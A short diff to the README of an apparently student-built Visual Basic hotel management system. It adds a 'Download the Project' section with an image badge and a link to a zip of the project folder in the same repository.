@@ -10,6 +10,12 @@ I completed a database project that was intended to be a database management sys
 
 This is a hotel management system created using Visual Basic and designed to work with Microsoft Visual Basic 2010 Express.
 
+## Download the Project
+
+[![Download Project Folder](https://raw.githubusercontent.com/kibexd/hotel-management-system/main/image_processing20210903-12211-10oa6cw.gif)](https://github.com/kibexd/hotel-management-system/raw/main/hotel_mgmt_sys.zip)
+
+To get started, simply download the project folder [here](https://github.com/kibexd/hotel-management-system/raw/main/hotel_mgmt_sys.zip).
+
 ## Installation
 
 1. Download and install Microsoft Visual Basic 2010 Express from [here](https://s3.amazonaws.com/cspublic/setup/VBExpress.exe).
